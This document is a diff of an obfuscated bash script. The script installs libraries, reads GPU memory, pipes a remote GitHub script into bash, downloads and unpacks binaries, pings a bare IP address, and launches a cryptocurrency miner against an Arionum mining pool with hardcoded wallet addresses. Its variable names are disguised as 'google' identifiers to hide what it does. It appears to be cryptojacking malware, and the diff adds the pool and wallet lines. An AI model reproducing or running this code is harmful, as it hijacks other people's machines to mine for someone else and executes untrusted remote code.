@@ -2,10 +2,6 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 apt-get install -y bc
 
-arr[0]="http://port.aro.wellgitu.com"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274="http://mine.arionumpool.com"
-
 if [[ $google84121274 == *"failed"* ]]; then
 
 curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
@@ -16,6 +12,8 @@ while true
 do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+google841212121274="http://mine.arionumpool.com"
 
 curl -s http://154.127.52.52/curlgoogle84.php
 
@@ -52,21 +50,27 @@ linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-
 
 else
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
+google841212121274="http://mine.arionumpool.com"
+
 curl -s http://154.127.52.52/curlgoogle84.php
 
 pkill -f curl84
+
+arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
+arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
+arr[2]="4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj"
+arr[3]="xZDcVyJeLLxqqsn6CeygQMR5zBTi9Gfk1d7XG3rj7WmypGrqRVBXWHg3WMk7yNfpbXnw85LBzY6j42F4qgpJRUP"
+arr[4]="2z2hwRPjLrQoN3UBsCX4EMRQxdcMxMFsQeJkUnZvgGXZnAsG2dBf3FXZdrk9stxzgd2Hrzdy8HxQb6AGFEEa5xkk"
+arr[5]="28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw3cNjWR3A6WMnGoa2"
+arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9"
+arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
+rand=$[$RANDOM % ${#arr[@]}]
+google84121212121212121274=${arr[2]}
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
 
@@ -79,21 +83,12 @@ tar -xf ./linux847412741274.tar.gz
 
 cd googleapps8474
 
-google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
-
 count=$(echo "$google84121274 - 800"|bc)
 googlelinux84=$(echo "$count / 524288"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-
 
 fi
 
